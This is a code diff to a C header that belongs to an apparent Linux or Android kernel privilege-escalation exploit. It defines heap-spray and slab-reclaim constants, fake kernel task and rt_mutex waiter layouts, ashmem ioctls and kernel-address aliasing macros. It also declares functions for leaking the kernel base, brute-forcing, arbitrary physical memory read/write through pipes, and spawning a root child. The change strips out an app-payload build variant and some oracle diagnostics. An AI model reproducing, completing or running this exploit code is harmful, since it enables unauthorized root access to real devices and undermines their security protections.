@@ -33,7 +33,6 @@
 #include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/uio.h>
-#include <sys/un.h>
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
@@ -41,27 +40,16 @@
 #include "kernelsnitch/utils.h"
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
-#else
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
-#endif
-#ifndef SKB_DATA_DELTA
 #define SKB_DATA_DELTA (-0xe80LL)
-#endif
 
 #define ASHMEM_NAME_LEN 256
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
-#ifndef MM_STRUCT_SZ
 #define MM_STRUCT_SZ 0x500
-#endif
-#ifndef MM_ORDER
 #define MM_ORDER 3
-#endif
 #define MM_PARTIALS 5
 #define CORE 0
 #define KSNITCH_COLLISIONS 4
@@ -70,17 +58,11 @@
 #define PIPE_CANDIDATE_PAGES 8
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
 #define SKB_RECLAIM_SENDS 4
-#define APP_SLIDE_RECLAIM_SENDS 16
 #define FOPS_TABLE_OFF FOPS_OFF
 #define SKB_FRAG_BIAS 0
 
 #define FAKE_TASK_PRIO 120
-#ifndef FAKE_WAITER_PRIO
 #define FAKE_WAITER_PRIO 130
-#endif
-#ifndef SLIDE_FAKE_WAITER_PRIO
-#define SLIDE_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
-#endif
 #define ASHMEM_NAME_PREFIX_LEN 11
 #define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
 
@@ -99,13 +81,9 @@
 #define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
 #define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
 #define KMALLOC_NORMAL_TYPE 0
-#ifndef KMALLOC_CGROUP_TYPE
 #define KMALLOC_CGROUP_TYPE 2
-#endif
 #define KMALLOC_PIPE_INDEX 11
-#ifndef KMALLOC_CACHE_TYPES
 #define KMALLOC_CACHE_TYPES 4
-#endif
 #define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
 #define KMALLOC_CACHE_SLOT(type, index) \
   (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
@@ -135,11 +113,7 @@
 #define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define PIPE_MAX_ATTEMPTS 4
-#else
 #define PIPE_MAX_ATTEMPTS 12
-#endif
 
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
 #define P0_DATA_ALIAS_CONST(image_addr) \
@@ -150,56 +124,18 @@
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
-#ifndef PSELECT_ENTER_DELAY_USEC
 #define PSELECT_ENTER_DELAY_USEC 50000
-#endif
-#ifndef SLIDE_WAITER_WAKE_STATE
-#define SLIDE_WAITER_WAKE_STATE 3
-#endif
-#ifndef SLIDE_LOCK_OWNER_VALUE
-#define SLIDE_LOCK_OWNER_VALUE 0ULL
-#endif
-#ifndef LEGACY_RT_MUTEX_WAITER
-#define LEGACY_RT_MUTEX_WAITER 0
-#endif
-#ifndef COMPACT_RT_MUTEX_WAITER
-#define COMPACT_RT_MUTEX_WAITER 0
-#endif
-#if LEGACY_RT_MUTEX_WAITER && COMPACT_RT_MUTEX_WAITER
-#error "select only one rt_mutex_waiter layout"
-#endif
-#ifndef FAKE_WAITER_LAYOUT_SIZE
-#define FAKE_WAITER_LAYOUT_SIZE (FAKE_WAITER_WW_CTX_OFF + sizeof(uint64_t))
-#endif
-#define PSELECT_TIMEOUT_SEC 1
+#define PSELECT_TIMEOUT_SEC 5
 #ifndef ROUTE_WAIT_SECONDS
 #define ROUTE_WAIT_SECONDS 8
 #endif
-#if defined(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
-#define SLIDE_NFULNL_LOGGER_NAME \
-  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
-#define SLIDE_NFULNL_LOGGER_OBJECT \
-  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_OBJECT_IMAGE)
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR \
-  P0_DATA_ALIAS_CONST(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE)
-#else
-#define SLIDE_NFULNL_LOGGER_NAME \
+#define EARLY_PIPE_PREPARE 0
+#define SLIDE_NFULNL_LOGGER \
   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
-#define SLIDE_NFULNL_LOGGER_OBJECT \
-  P0_DATA_ALIAS_CONST(SLIDE_LOGGERS_0_1_IMAGE)
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR \
+#define SLIDE_LOGGERS_0_1 P0_DATA_ALIAS_CONST(SLIDE_LOGGERS_0_1_IMAGE)
+#define SLIDE_RANDOM_BOOT_ID_DATA \
   P0_DATA_ALIAS_CONST(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
-#define SLIDE_NFULNL_LOGGER SLIDE_NFULNL_LOGGER_NAME
-#define SLIDE_RANDOM_BOOT_ID_DATA SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR
-#define SLIDE_LOGGERS_0_1 SLIDE_NFULNL_LOGGER_OBJECT  
-#endif
-#ifndef SLIDE_WAITER_TREE_LEFT
-#define SLIDE_WAITER_TREE_LEFT SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR
-#endif
 #define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
-#ifndef SLIDE_WAITER_TASK
-#define SLIDE_WAITER_TASK SLIDE_INIT_TASK
-#endif
 #define SLIDE_ROOT_TASK_GROUP \
   P0_DATA_ALIAS_CONST(SLIDE_ROOT_TASK_GROUP_IMAGE)
 #define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)
@@ -395,11 +331,6 @@ extern char found_task_comm[TASK_COMM_LEN + 1];
 extern pid_t root_child_pid;
 extern int root_ready_pipe[2];
 extern struct root_shared *root_shared;
-extern uintptr_t slide_p0_offset;
-extern uintptr_t slide_oracle_parent;
-extern uintptr_t slide_oracle_target;
-extern uintptr_t p0_gate_page_struct;
-extern uintptr_t p0_probe_page_struct;
 extern int memfd_leak;
 
 int run_exploit(int argc, char **argv);
@@ -437,7 +368,6 @@ pid_t clone_leak_child(void);
 int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
-int reclaim_receiver_fd(void);
 void setup_kernelsnitch(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
@@ -459,7 +389,6 @@ void open_selected_fds(
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
 
-int slide_leak_kernel_base(void);
 int slide_pselect_words_per_set(void);
 int slide_pselect_global_word(int waiter_word);
 int slide_pselect_put_global_word(
@@ -478,15 +407,7 @@ void slide_pselect_stack_copy(void);
 int hex_value(char c);
 uint64_t slide_read_stext(void);
 uint64_t slide_child_leak_stext(void);
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-void app_publish_p0_offset(uintptr_t offset);
-void app_publish_p0_dirty(void);
-int select_slide_payload_slot(uintptr_t offset);
-int select_slide_payload_index(size_t index);
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-int app_trigger_fops_slide_route(void);
-#endif
-#endif
+int slide_leak_kernel_base(void);
 
 ssize_t configfs_write_once(
     int fd, uintptr_t target, const void *data, size_t len);
@@ -537,14 +458,6 @@ uint64_t pipe_read64(int fd, uintptr_t direct_addr);
 uint32_t pipe_read32(int fd, uintptr_t direct_addr);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-int prepare_p0_pipe_oracle(void);
-int expand_p0_pipe_oracle(void);
-int verify_p0_pipe_oracle_gate(void);
-uintptr_t scan_p0_pipe_oracle(void);
-int restore_p0_oracle_pages(int fd);
-int run_p0_pipe_oracle_diagnostic(int fd);
-#endif
 
 int spawn_root_child(void);
 int collect_root_child(void);
